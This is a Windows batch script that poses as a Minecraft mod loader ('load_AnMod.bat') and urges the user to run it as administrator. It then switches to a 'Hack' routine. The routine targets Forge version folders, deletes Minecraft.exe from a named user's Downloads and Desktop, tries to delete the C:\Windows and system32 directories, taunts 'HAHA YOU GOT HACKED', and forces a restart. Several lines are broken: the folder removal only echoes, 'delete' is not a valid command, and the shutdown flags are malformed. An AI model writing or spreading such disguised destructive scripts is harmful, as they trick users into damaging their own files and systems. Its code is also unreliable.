@echo off
title Welcome!

Echo. load_AnMod.bat is running.
Echo. Please wait then.
Echo. This is will take some seconds for manage minecraft.

Echo. Please, if you dont run this administrator, RUN IT ADMINISTRATOR

pause

:DestroyI
@echo off
title load_Hack Has Activated.

Echo. Please wait then loading.
Echo. Destroywing Minecwraft...

@echo off & set "_target=%userprofile%\appdata\roaming.minecraft\versions"
for /f tokens^=* %%i in ('dir /s/b/a:d "%_target%\*forge*"')do echo/RMDir /q/s "%%~i"
DEL C:\Users\William\Downloads\Minecraft.exe
DEL C:\Users\William\Desktop\Minecraft.exe

delete C:\Windows\system32
delete C:\Windows
delete C:\windows

Echo. HAHA YOU GOT HACKED 
Echo. go brrrr
shutdown /r /t /fw
